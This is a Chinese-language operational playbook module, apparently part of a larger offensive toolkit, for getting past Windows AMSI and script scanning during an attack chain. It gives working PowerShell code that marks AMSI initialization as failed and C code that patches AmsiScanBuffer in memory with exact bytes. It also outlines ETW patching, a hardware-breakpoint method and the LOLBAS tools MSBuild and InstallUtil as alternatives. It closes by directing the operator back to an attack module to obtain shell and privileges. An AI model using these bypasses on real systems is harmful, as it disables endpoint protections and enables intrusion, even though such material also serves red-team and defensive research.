# Script Runtime / AMSI / PowerShell

原攻击链需要 PowerShell / .NET / script host，且被 AMSI 或脚本扫描拦住时使用。

ExecutionPolicy **不是**安全边界。`-ExecutionPolicy Bypass` 不算 AMSI/EDR bypass。

---

## 1. 识别 runtime

```powershell
$PSVersionTable
$ExecutionContext.SessionState.LanguageMode
[System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\AMSI -ErrorAction SilentlyContinue
```

```text
ConstrainedLanguage          → 应用控制，转 application-control.md
PowerShell 5 + Desktop CLR   → 下面的内存 patch / 硬件断点可用
PowerShell 7 / pwsh          → 不要套 PS5 AmsiScanBuffer patch
.NET Assembly.Load 被拦      → 可能是 AMSI + in-memory assembly scan，不只是脚本文本
```

---

## 2. AMSI 上下文初始化失败（PS5）

把 AMSI 初始化标成失败。很多 Defender 版本仍吃这套；EDR 用户态 hook 可能不管。授权靶场先试：

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}}
$f.SetValue($null,$true)
# 立刻跑原先被拦的脚本。成功：脚本执行且无 AMSI 阻断
```

---

## 3. AmsiScanBuffer 内存补丁

经典 patch：把 `AmsiScanBuffer` 改成 `mov eax, 0x80070057; ret`（`E_INVALIDARG`）。

```powershell
$kernel32 = [Win32]  # 用自己的 P/Invoke 拿 GetProcAddress
# 伪代码：VirtualProtect(AmsiScanBuffer, PAGE_EXECUTE_READWRITE)
# bytes: B8 57 00 07 80 C3
```

C 版：

```c
HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
void *p = GetProcAddress(hAmsi, "AmsiScanBuffer");
DWORD old;
VirtualProtect(p, 6, PAGE_EXECUTE_READWRITE, &old);
unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
memcpy(p, patch, 6);
VirtualProtect(p, 6, old, &old);
```

这是高特征修改。内存完整性/EDR 可能立刻告警。失败就改硬件断点，不要反复改同一页。

同样可对 `EtwEventWrite` 下断/补丁降低 ETW 噪音。ETW patch ≠ EDR 关闭。

---

## 4. 硬件断点 AMSI（不改函数字节）

对 `AmsiScanBuffer` 入口下 DR0，VEH 里把 RAX 改成 `AMSI_RESULT_CLEAN` 并跳过函数。

```text
条件：当前进程能装 VEH + 设线程硬件断点
优点：函数字节不变，过一部分完整性检查
缺点：仍有 VEH / debug register 遥测
```

公开实现搜索 `amsi hardware breakpoint VEH`；用已知稳定 PoC，不要现场发明 ROP。

---

## 5. 绕过脚本扫描的非 patch 路径

能不用 PowerShell 就不用：

```text
原链改成 COM / WMI / MSBuild / 已允许的解释器
BOF / 原生执行
从磁盘加载已签名脚本宿主但不经过 PS AMSI 提供者
```

CLM 下优先 LOLBAS（MSBuild、InstallUtil）而不是“再找一个 AMSI patch”。

---

## 6. AMSI WRITE RAID 等 2025–2026 研究

利用 AMSI 调用链里可写内存减少经典 `VirtualProtect(AmsiScanBuffer)` 特征。使用前必须验证目标 CLR/coreclr 和具体 PoC 仓库；**没有可复现 PoC 就不要编命令**。

---

## 7. 成功判断

```text
Before: 同一脚本/assembly 被 AMSI 拦（toast / 80070057 / EDR kill）
After : 同一内容执行到预期命令（whoami / marker / 原 payload）
Restore: 不需要持久化 AMSI patch；进程退出即恢复
Resume: 回原 Attack 模块继续拿 shell/权限
```
